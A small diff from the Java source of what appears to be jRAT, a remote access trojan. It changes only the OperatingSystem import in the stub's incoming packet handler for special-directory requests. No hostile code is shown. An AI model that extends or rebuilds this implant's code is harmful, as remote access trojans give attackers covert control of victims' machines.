@@ -1,8 +1,9 @@
 package se.jrat.stub.packets.incoming;
 
-import se.jrat.common.OperatingSystem;
 import se.jrat.stub.Connection;
 import se.jrat.stub.packets.outgoing.Packet34CustomDirectory;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 public class Packet41SpecialDirectory extends AbstractIncomingPacket {
 
